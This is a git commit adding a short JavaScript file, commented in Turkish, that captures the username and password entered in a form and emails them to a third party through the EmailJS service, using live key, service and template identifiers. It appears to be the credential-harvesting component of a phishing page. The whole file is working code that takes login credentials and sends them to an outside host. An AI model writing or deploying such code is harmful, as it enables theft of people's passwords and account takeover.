36db02f6882af2ddbd59cd749665346a31cc3988
Kamran3325 <mkamran0528@gmail.com>
2024-08-02 16:32:44 +0400

    Add files via upload

---
+++ script.js
@@ -0,0 +1,25 @@
+(function() {
+    // EmailJS'i başlat
+    emailjs.init('VVZvHX8p7UeYXyDQP');
+
+    document.getElementById('emailForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        // Formdan veri al
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // EmailJS'e veri gönder
+        emailjs.send('service_m5ebe2f', 'template_dj6sica', {
+            username: username,
+            password: password
+        })
+        .then(function(response) {
+            console.log('Başarılı!', response.status, response.text);
+            console.log('E-posta başarıyla gönderildi!');
+        }, function(error) {
+            console.log('Başarısız!', error);
+            console.log('E-posta gönderilirken bir hata oluştu.');
+        });
+    });
+})();
